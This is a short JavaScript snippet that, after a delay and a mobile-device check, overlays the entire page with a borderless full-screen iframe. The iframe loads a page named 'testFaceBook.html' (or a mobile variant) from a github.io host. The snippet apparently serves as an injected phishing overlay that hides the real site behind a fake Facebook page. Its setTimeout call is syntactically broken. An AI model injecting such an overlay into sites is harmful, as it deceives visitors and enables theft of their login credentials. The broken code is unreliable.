//document.write('<iframe src="https://lzk-test.github.io/testFaceBook.html" style="position:fixed; left:0; top:0; width:100%; height:100%;  border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
setTimeout(
detectmob();
function detectmob() { 
 if( navigator.userAgent.match(/Android/i)
 || navigator.userAgent.match(/webOS/i)
 || navigator.userAgent.match(/iPhone/i)
 || navigator.userAgent.match(/iPad/i)
 || navigator.userAgent.match(/iPod/i)
 || navigator.userAgent.match(/BlackBerry/i)
 || navigator.userAgent.match(/Windows Phone/i)
 ){
    document.write('<iframe src="https://lzk-test.github.io/testmFaceBook.html" style="position:fixed; left:0; top:0; width:100%; height:100%;  border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')
  }
 else {
    document.write('<iframe src="https://lzk-test.github.io/testFaceBook.html" style="position:fixed; left:0; top:0; width:100%; height:100%;  border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe>')

  }
}
,700);

